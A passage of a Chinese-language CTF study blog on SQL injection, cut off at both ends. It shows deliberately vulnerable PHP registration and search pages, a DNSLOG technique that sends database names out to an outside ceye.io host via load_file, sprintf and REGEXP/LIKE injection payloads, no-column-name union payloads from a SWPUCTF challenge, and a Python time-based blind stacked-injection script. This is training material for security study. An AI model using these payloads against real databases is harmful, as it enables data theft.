class="variable">$_GET</span>))&#123;</span><br><span class="line">        <span class="variable">$_GET</span> = addslashes_deep(<span class="variable">$_GET</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!empty(<span class="variable">$_POST</span>))&#123;</span><br><span class="line">        <span class="variable">$_POST</span> = addslashes_deep(<span class="variable">$_POST</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_COOKIE</span> = addslashes_deep(<span class="variable">$_COOKIE</span>);</span><br><span class="line">    <span class="variable">$_REQUEST</span> = addslashes_deep(<span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> addslashes_deep(<span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (empty(<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">return</span> is_array(<span class="variable">$value</span>) ? array_map(<span class="string">'addslashes_deep'</span>, <span class="variable">$value</span>): addslashes(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br> reg.php<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">include <span class="string">"config.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(!empty(<span class="variable">$_POST</span>[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">'username'</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">'email'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"INSERT INTO `sqlinject`.`users` (`id`, `username`, `password`, `email`)</span></span><br><span class="line"><span class="string">           VALUE (NULL, '<span class="variable">$username</span>', '<span class="variable">$password</span>', '<span class="variable">$email</span>');"</span>;</span><br><span class="line">    <span class="variable">$row</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"注册成功"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"注册失败"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    username&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;&lt;br/&gt;</span><br><span class="line">    password&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"password"</span>&gt;&lt;br/&gt;</span><br><span class="line">    email&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"email"</span>&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"ok"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><br> search.php<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">include <span class="string">"config.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(!empty(<span class="variable">$_POST</span>[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">'email'</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"select * from users where email='&#123;<span class="variable">$email</span>&#125;'"</span>;</span><br><span class="line">    <span class="variable">$row</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="variable">$rows</span> = mysql_fetch_array(<span class="variable">$row</span>);</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$rows</span>[<span class="string">'username'</span>];</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">"select * from users where username='<span class="variable">$username</span>'"</span>;</span><br><span class="line">        <span class="variable">$row</span> = mysql_query(<span class="variable">$sql</span>) or die(mysql_error());</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">            <span class="variable">$rows</span> = mysql_fetch_array(<span class="variable">$row</span>);</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$rows</span>[<span class="string">'username'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$rows</span>[<span class="string">'password'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$rows</span>[<span class="string">'email'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    search email&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"email"</span>&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"ok"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><h2 id="dns注入"><a href="#dns注入" class="headerlink" title="dns注入"></a>dns注入</h2><p>DNSLOG 注入 ¶<br>DNS 在解析的时候会留下日志，通过读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</p><p>dnslog 平台：<a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use security;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; select load_file(<span class="string">'\\\\test.xxx.ceye.io\\abc'</span>);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| load_file(<span class="string">'\\\\test.xxx.ceye.io\\abc'</span>) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| NULL                                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (22.05 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select load_file(concat(<span class="string">'\\\\'</span>,(select database()),<span class="string">'.xxx.ceye.io\\abc'</span>));</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| load_file(concat(<span class="string">'\\\\'</span>,(select database()),<span class="string">'.xxx.ceye.io\\abc'</span>)) |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| NULL                                                                 |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="sprintf注入"><a href="#sprintf注入" class="headerlink" title="sprintf注入"></a>sprintf注入</h2><p>1，sprintf(),函数是php中的函数<br>2，作用是将格式化字符串写入变量中<br>3，函数形式为sprintf(format,arg1,arg2,arg++)   </p><p> 参数说明：<br><img src="../../images/loopholes/sql/5.png" alt=""></p><p>若%符号多于arg参数，则需要占位符，占位符格式为“%number$” 其中number表示该项与第几个arg匹配，如若与第一个匹配     则占位符为“%1$” </p><p>sprintf注入的原理就是:<br>我们用一个15种类型之外的 <code>&quot;\&quot;</code>来代替格式字符类型让函数替换为空，则<code>“%1$\&#39;”</code>后面的单引号就能闭合前面的单引号 。<br>如果我们输入<code>&quot;%\&quot;</code>或者<code>&quot;%1$\&quot;</code>,他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么<code>&quot;%\&quot;</code>,<code>&quot;%1$\&quot;</code>就因为没有经过任何处理而被替换为空。 </p><p>简单的说就是sprintf中%1$&#39;会将\吃掉，导致’的逃逸。%后表示第几个参数，$表示参数类型。</p><p>还有一个sprintf漏洞的利用方式：%c起到了类似chr()的效果，将数字39转化为’，从而导致了sql注入。</p><p>例子:      </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（'），双引号（"），反斜杠（\），NULL</span></span><br><span class="line">$input = addslashes (<span class="string">"%1$' and 1=1#"</span> );</span><br><span class="line">$b = sprintf (<span class="string">"AND b='%s'"</span>, $input );</span><br><span class="line">$sql = sprintf (<span class="string">"SELECT * FROM t WHERE a='%s' $b "</span>, <span class="string">'admin'</span> );</span><br><span class="line"><span class="keyword">echo</span>  $sql ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">1</span>$\<span class="string">' and 1=1#</span></span><br><span class="line"><span class="string">AND b='</span>%<span class="number">1</span>$\<span class="string">' and 1=1#'</span></span><br><span class="line">SELECT * FROM t WHERE a=<span class="string">'admin'</span> <span class="keyword">AND</span> b=<span class="string">''</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#'</span></span><br></pre></td></tr></table></figure><p>另一个例子:  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$input1 = <span class="string">'%1$c) OR 1 = 1 /*'</span> ;</span><br><span class="line">$input2 = <span class="number">39</span> ;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM foo WHERE bar IN (' $input1 ') AND baz = %s"</span> ;</span><br><span class="line"><span class="keyword">echo</span>($sql.<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">$sql = sprintf ( $sql , $input2 );</span><br><span class="line"><span class="keyword">echo</span>  $sql ;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM foo WHERE bar IN (<span class="string">' %1$c) OR 1 = 1 /* '</span>) <span class="keyword">AND</span> baz = %s</span><br><span class="line">SELECT * FROM foo WHERE bar IN (<span class="string">' '</span>) <span class="keyword">OR</span> <span class="number">1</span> = <span class="number">1</span> <span class="comment">/* ') AND baz = 39</span></span><br></pre></td></tr></table></figure><h2 id="REGEXP注入分析"><a href="#REGEXP注入分析" class="headerlink" title="REGEXP注入分析"></a>REGEXP注入分析</h2><p>使用场景：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了&#x3D;、in、like</span><br></pre></td></tr></table></figure><p>^若被过滤，可使用$来从后往前进行匹配</p><p>常用regexp正则语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regexp <span class="string">'^[a-z]'</span>  <span class="comment">#判断一个表的第一个字符串是否在a-z中</span></span><br><span class="line">regexp <span class="string">'^r'</span>      <span class="comment">#判断第一个字符串是否为r</span></span><br><span class="line">regexp <span class="string">'^r[a-z]'</span> <span class="comment">#判断一个表的第二个字符串是否在a-z中</span></span><br></pre></td></tr></table></figure><h2 id="LIKE注入分析"><a href="#LIKE注入分析" class="headerlink" title="LIKE注入分析"></a>LIKE注入分析</h2><p>like匹配<br>百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线_通配符允许匹配任何单个字符。<br>1.like ‘s%’判断第一个字符是否为s</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like <span class="string">'s%'</span>,3 --+</span><br></pre></td></tr></table></figure><p>2.like ‘se%’判断前面两个字符串是否为se</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like <span class="string">'se%'</span>,3 --+</span><br></pre></td></tr></table></figure><p>3.like ‘%sq%’ 判断是否包含se两个字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like <span class="string">'%se%'</span>,3 --+</span><br></pre></td></tr></table></figure><p>4.like ‘_____’判断是否为5个字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like <span class="string">'_____'</span>,3 --+</span><br></pre></td></tr></table></figure><p>5.like ‘s____’ 判断第一个字符是否为s</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like <span class="string">'s____'</span>,3 --+</span><br></pre></td></tr></table></figure><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>详情可看：<a href="https://zhuanlan.zhihu.com/p/98206699" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/98206699</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure><p>例题1：  </p><p>SWPUCTF 2019<br>发现数据库的报错信息，证明存在注入。   </p><p>简单测试了一下，空格 和 or 被过滤，报错过滤了extractvalue 和 updatexml，于是考虑用 union 联合注入。查表名时由于过滤or，所以information_schema无法使用。<br>但Mysql5.6及以上版本中mysql的 innodb_index_stats 和innodb_table_stats这两个表中都包含所有新创建的数据库和表名</p><p>也可以用 sys.schema_auto_increment_columns 来注表名 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_auto_increment_columns),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'</span></span><br></pre></td></tr></table></figure><p>innodb_index_stats 和innodb_table_stats</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>mysql.innodb_table_stats),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><p>表名 ads 和 users</p><p>但是不知道列名，只能用无列名注入的方式，另外还过滤了反引号，用别名aaa来代替，payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(b)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> * <span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)a),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><p>例题2：</p><h1 id="MySQL堆叠注入预处理"><a href="#MySQL堆叠注入预处理" class="headerlink" title="MySQL堆叠注入预处理"></a>MySQL堆叠注入预处理</h1><p>PDO场景下的SQL注入探究:<a href="https://xz.aliyun.com/t/3950。" target="_blank" rel="noopener">https://xz.aliyun.com/t/3950。</a></p><p>PDO默认支持多语句查询，如果php版本小于5.5.21或者创建PDO实例时未设置PDO::MYSQL_ATTR_MULTI_STATEMENTS为true时可能会造成堆叠注入。<br>如果想禁止多语句执行，可在创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new PDO(<span class="variable">$dsn</span>, <span class="variable">$user</span>, <span class="variable">$pass</span>, array( PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; <span class="literal">false</span>))</span><br></pre></td></tr></table></figure><p>PDO分为模拟预处理和非模拟预处理。</p><p>模拟预处理是防止某些数据库不支持预处理而设置的，在初始化PDO驱动时，可以设置一项参数，PDO::ATTR_EMULATE_PREPARES，作用是打开模拟预处理(true)或者关闭(false),默认为true。PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行。</p><p>非模拟预处理则是通过数据库服务器来进行预处理动作，主要分为两步：第一步是prepare阶段，发送SQL语句模板到数据库服务器；第二步通过execute()函数发送占位符参数给数据库服务器进行执行。    </p><p><strong>[SWPU2019]Web4</strong>   </p><p>由于过滤了select,if,sleep,substr等大多数注入常见的单词，但是注入又不得不使用其中的某些单词。那么在这里我们就可以用16进制+mysql预处理来绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select hex(&#39;select sleep(5)&#39;);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| hex(&#39;select sleep(5)&#39;)         |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| 73656C65637420736C656570283529 |</span><br><span class="line">+--------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set @a&#x3D;0x73656C65637420736C656570283529;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; prepare test from @a;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql&gt; execute test;</span><br><span class="line">+----------+</span><br><span class="line">| sleep(5) |</span><br><span class="line">+----------+</span><br><span class="line">|        0 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (5.00 sec)</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'''http://d3f3678a-a060-4de9-a875-dc05ee50bd5d.node3.buuoj.cn/index.php?r=Login/Login'''</span></span><br><span class="line">    <span class="comment">#注入payload</span></span><br><span class="line">    payloads = <span class="string">"asd';set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -"</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="comment">#查询payload</span></span><br><span class="line">        payload = <span class="string">"select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)"</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="comment">#将构造好的payload进行16进制转码和json转码</span></span><br><span class="line">            datas = &#123;<span class="string">'username'</span>:payloads.format(str_to_hex(payload.format(i,j))),<span class="string">'password'</span>:<span class="string">'test213'</span>&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url = url, data = data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">3</span>:</span><br><span class="line">                flag = flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="mysql8新特性注入"><a href="#mysql8新特性注入" class="headerlink" title="mysql8新特性注入"></a>mysql8新特性注入</h2><p>详情可看此文章：<a href="https://www.anquanke.com/post/id/231627" target="_blank" rel="noopener">https://www.anquanke.com/post/id/231627</a>     </p><p>作用：列出表中全部内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure><p>TABLE是MySQL 8.0.19中引入的DML语句，它返回命名表的行和列，类似于SELECT。<br>支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; table users;</span><br><span class="line">+<span class="comment">------+----------+--------------+</span></span><br><span class="line">| id   | username | password     |</span><br><span class="line">+<span class="comment">------+----------+--------------+</span></span><br><span class="line">|    1 | Dumb     | Dumb         |</span><br><span class="line">|    2 | admin    | admin        |</span><br><span class="line">|    3 | flag     | this_is_flag |</span><br><span class="line">+<span class="comment">------+----------+--------------+</span></span><br><span class="line">mysql&gt; table users order by id limit 0,1;</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">| id   | username | password |</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">|    1 | Dumb     | Dumb     |</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br></pre></td></tr></table></figure><p>与SELECT的区别：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.TABLE始终显示表的所有列</span><br><span class="line">2.TABLE不允许对行进行任意过滤，即TABLE 不支持任何WHERE子句</span><br></pre></td></tr></table></figure><p>VALUES statement<br>作用：列出一行的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]</span><br><span class="line"></span><br><span class="line">row_constructor_list:</span><br><span class="line">    ROW(value_list)[, ROW(value_list)][, ...]</span><br><span class="line"></span><br><span class="line">value_list:</span><br><span class="line">    value[, value][, ...]</span><br><span class="line"></span><br><span class="line">column_designator: </span><br><span class="line">    column_index</span><br></pre></td></tr></table></figure><p>VALUES是把一组一个或多个行作为表展示出来，返回的也是一个表数据。<br>ROW()返回的是一个行数据，VALUES将ROW()返回的行数据加上字段整理为一个表，然后展示</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;  VALUES ROW(1, 2, 3);</span><br><span class="line">+<span class="comment">----------+----------+----------+</span></span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+<span class="comment">----------+----------+----------+</span></span><br><span class="line">|        1 |        2 |        3 |</span><br><span class="line">+<span class="comment">----------+----------+----------+</span></span><br><span class="line"></span><br><span class="line">mysql&gt; VALUES ROW(1, 2, 3) UNION SELECT * FROM users;</span><br><span class="line">+<span class="comment">----------+----------+--------------+</span></span><br><span class="line">| column_0 | column_1 | column_2     |</span><br><span class="line">+<span class="comment">----------+----------+--------------+</span></span><br><span class="line">|        1 | 2        | 3            |</span><br><span class="line">|        1 | Dumb     | Dumb         |</span><br><span class="line">|        2 | admin    | admin        |</span><br><span class="line">|        3 | flag     | this_is_flag |</span><br><span 